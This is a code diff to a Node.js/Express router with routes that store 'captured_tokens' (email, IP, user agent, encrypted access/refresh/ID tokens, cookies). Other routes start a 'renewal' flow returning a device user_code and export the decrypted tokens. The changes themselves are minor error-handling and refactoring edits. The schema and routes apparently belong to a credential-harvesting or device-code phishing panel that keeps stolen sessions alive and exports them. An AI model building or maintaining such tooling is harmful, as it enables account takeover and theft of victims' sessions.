@@ -429,8 +429,8 @@ router.post('/:id/renew', userAuth, async (req, res) => {
     if (result.user_code) {
       // Store the renewal record
       await db.query(
-        'INSERT INTO cookie_renewals (capture_id, user_id, user_code, job_id, created_at) VALUES (?, ?, ?, ?, NOW())',
-        [token.id, req.user.id, result.user_code, result.job_id]
+        'INSERT INTO cookie_renewals (capture_id, user_id, user_code, success, created_at) VALUES (?, ?, ?, 0, NOW())',
+        [token.id, req.user.id, result.user_code]
       );
       
       res.json({
@@ -445,8 +445,10 @@ router.post('/:id/renew', userAuth, async (req, res) => {
       res.status(400).json({ error: 'Failed to start renewal flow', success: false });
     }
   } catch (err) {
-    console.error('[Tokens] Renewal error:', err);
-    res.status(500).json({ error: 'Renewal failed: ' + err.message });
+    const errorMsg = err.message || err.toString() || 'Unknown error';
+    const errorCode = err.code || err.errno || 'RENEWAL_ERROR';
+    console.error('[Tokens] Renewal error:', errorCode, errorMsg);
+    res.status(500).json({ error: 'Renewal failed: ' + errorMsg, code: errorCode });
   }
 });
 
@@ -571,7 +573,7 @@ router.post('/export', userAuth, async (req, res) => {
       'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
       [req.user.id]
     );
-    const config = require('../config/env');
+    const cfg = require('../config/env');
     
     // Decrypt tokens for export
     const decryptedTokens = tokens.map(token => ({
